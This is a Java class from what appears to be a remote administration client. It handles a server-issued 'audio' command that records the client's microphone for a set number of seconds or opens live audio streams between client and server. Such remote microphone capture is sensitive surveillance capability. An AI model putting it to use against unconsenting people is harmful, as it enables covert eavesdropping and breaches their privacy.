package br.com.introcdc.connect.client.commands.audio;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:25
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.ConnectClient;
import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.AudioComponents;
import br.com.introcdc.connect.client.components.ImageComponents;

public class ClientCommandAudio extends ClientCommand {

    public ClientCommandAudio() {
        super("audio");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (input.isEmpty()) {
            msg("audio (seconds/receive/send)");
            return;
        }
        if (input.equalsIgnoreCase("receive")) {
            if (ImageComponents.AUDIO_USER_LIVE) {
                ImageComponents.AUDIO_USER_LIVE = false;
                msg("Finalizando transmissão de áudio do cliente para o servidor...");
            } else {
                msg("Conectando ao servidor de áudio do servidor para transmissão do cliente para o servidor...");
                msg("audio-user");
                ConnectClient.EXECUTOR.schedule(() -> new Thread(() -> {
                    try {
                        AudioComponents.connectMicrophoneServer(true);
                    } catch (Exception exception) {
                        msg("stopliveaudiouserOcorreu um erro ao inicializar a conexão de transmissão de áudio do cliente para servidor! (" + exception.getMessage() + ")");
                        exception(exception);
                    }
                }).start(), Connect.DELAY, Connect.DELAY_TYPE);
            }
        } else if (input.equalsIgnoreCase("send")) {
            if (ImageComponents.AUDIO_SERVER_LIVE) {
                ImageComponents.AUDIO_SERVER_LIVE = false;
                msg("Finalizando transmissão de áudio do servidor para o cliente...");
            } else {
                msg("Conectando ao servidor de áudio do servidor para transmissão do servidor para o cliente...");
                msg("audio-server");
                ConnectClient.EXECUTOR.schedule(() -> new Thread(() -> {
                    try {
                        AudioComponents.connectMicrophoneServer(false);
                    } catch (Exception exception) {
                        msg("stopliveaudioserverOcorreu um erro ao inicializar a conexão de transmissão de áudio do servidor para cliente! (" + exception.getMessage() + ")");
                        exception(exception);
                    }
                }).start(), Connect.DELAY, Connect.DELAY_TYPE);
            }
        } else {
            try {
                int seconds = Integer.parseInt(input);
                if (seconds < 1 || seconds >= 120) {
                    msg("Digite uma quantidade entre 1 e 120 para gravar o microfone!");
                    return;
                }
                AudioComponents.recordMicrophone(seconds);
            } catch (Exception ignored) {
                msg("Digite um número válido!");
            }
        }
    }

}
